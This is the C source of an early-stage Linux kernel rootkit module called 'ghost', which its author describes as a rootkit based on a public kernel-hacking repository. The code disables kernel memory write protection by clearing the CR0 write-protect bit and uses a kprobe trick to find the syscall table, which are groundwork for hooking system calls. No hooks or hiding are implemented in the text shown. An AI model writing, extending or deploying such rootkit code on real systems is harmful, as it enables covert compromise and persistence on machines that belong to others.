#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include "include/ghost.h"

MODULE_AUTHOR("Ch4r0nN");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.0.2");



// disabling the protected mode of cr0

static inline void write_cr0_forced(unsigned long value)
{
    asm volatile("mov %0, %%cr0" : "+r"(value), "+m"(__force_order));
}


static inline void protect_memory(void)
{
    write_cr0_forced(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}

 /* Copyright © xcellerator
 *  thanks for making this wonderful Linux_Kernel_Hacking repo that inspired and based this rootkit
 *  Acknowledgment by: Ch4r0nN
 *  Link of repo: https://github.com/xcellerator/linux_kernel_hacking
 *  In this function we use kallsyms_lockup_name to find the memory address in the kernel
 */

unsigned long *
find_syscall_table(void)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);

    kallsyms_lookup_name = (kallsyms_lookup_name_t) kln_addr;

    unregister_kprobe(&kp);

    __syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    return __syscall_table;

}

static int __init ghost_init(void)
{
    __syscall_table = find_syscall_table();
    if(!__syscall_table)
    {
        printk(KERN_INFO "Error, syscall_table not found");
        return -1;
    }

    return 0;
}


static void __exit ghost_exit(void)
{

}
module_init(ghost_init);
module_exit(ghost_exit);
